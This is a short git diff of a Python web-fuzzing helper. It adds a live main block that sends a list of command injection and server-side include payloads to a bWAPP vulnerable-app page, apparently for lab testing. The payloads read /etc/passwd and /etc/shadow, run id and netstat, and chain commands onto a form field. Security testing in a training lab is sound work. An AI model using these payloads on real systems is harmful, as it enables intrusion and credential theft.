@@ -75,7 +75,6 @@ def post_request(url: str, payloads: list, data: dict, login_dvwa: bool = False)
         if (re.search("\$(.*?)\$", value) != None):
             v = postParser(value, payloads)
             current_data[key] = v
-    
     processed_data = []
     for key, value in current_data.items():
         if (len(value) > 1 and isinstance(value, list)):
@@ -99,6 +98,18 @@ def post_request(url: str, payloads: list, data: dict, login_dvwa: bool = False)
     return result
 
 
-# if __name__ == "__main__":
-    # payload 
-    # post_request("https://bwapp.hakhub.net/sqli_6.php", payload, {"title": "$$", "action": "search"}, login_dvwa=True)
+if __name__ == "__main__":
+    payload = """
+    cat /etc/passwd
+    &lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;
+    &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+    &lt;!--#exec%20cmd=&quot;/usr/bin/id;--&gt;
+    /index.html|id|
+    ;id;
+    ;id
+    ;netstat -a;
+    ;system('cat%20/etc/passwd')
+    ;id;
+    """.split("\n")
+    response = post_request("https://bwapp.hakhub.net/commandi.php", payload, {"target": "www.nsa.gov $$"}, login_dvwa=True)
+    print(response)
